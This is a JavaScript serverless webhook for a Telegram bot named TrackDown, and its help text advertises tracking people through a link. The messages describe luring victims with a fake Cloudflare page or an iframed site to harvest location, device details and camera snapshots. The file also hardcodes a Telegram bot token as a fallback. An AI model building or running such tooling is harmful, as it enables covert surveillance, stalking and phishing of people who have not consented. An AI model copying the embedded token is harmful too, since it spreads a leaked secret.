const TelegramBot = require('node-telegram-bot-api');

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  const botToken = process.env.BOT_TOKEN || '7233219216:AAFMv7UmrS8_t1j1h5BMv3lkUPF7sPHE3ag';
  
  if (!botToken) {
    return res.status(500).json({ error: 'Bot token not found' });
  }

  const bot = new TelegramBot(botToken, { polling: false });

  try {
    if (req.method === 'GET') {
      // Test endpoint
      const botInfo = await bot.getMe();
      return res.json({
        status: 'TrackDown Bot is running on Vercel!',
        bot: {
          username: botInfo.username,
          id: botInfo.id,
          name: botInfo.first_name
        },
        webhook: 'https://ak-track.vercel.app/api/webhook'
      });
    }

    if (req.method === 'POST') {
      const { message, callback_query } = req.body;
      
      if (message) {
        const chatId = message.chat.id;
        console.log('📨 Received message from:', message.chat.first_name, '(ID:', chatId + ')');

        if (message.text === '/start') {
          const m = {
            reply_markup: JSON.stringify({
              "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
            })
          };
          await bot.sendMessage(chatId, `Welcome ${message.chat.first_name}! \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location, device info, camera snaps.\n\nType /help for more info.`, m);
        } else if (message.text === '/help') {
          await bot.sendMessage(chatId, `Through this bot you can track people just by sending a simple link.\n\nSend /create to begin, afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving the url it will send you 2 links which you can use to track people.\n\nSpecifications.\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.\n2. Webview Link: This will show a website (ex bing, dating sites etc) using iframe for gathering information.\n( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown`);
        }
      } else if (callback_query) {
        await bot.answerCallbackQuery(callback_query.id);
        if (callback_query.data === "crenew") {
          const mk = {
            reply_markup: JSON.stringify({ "force_reply": true })
          };
          await bot.sendMessage(callback_query.message.chat.id, `🌐 Enter Your URL`, mk);
        }
      }
      
      return res.status(200).send('OK');
    }

  } catch (error) {
    console.error('Webhook error:', error);
    return res.status(500).json({ error: error.message });
  }
};
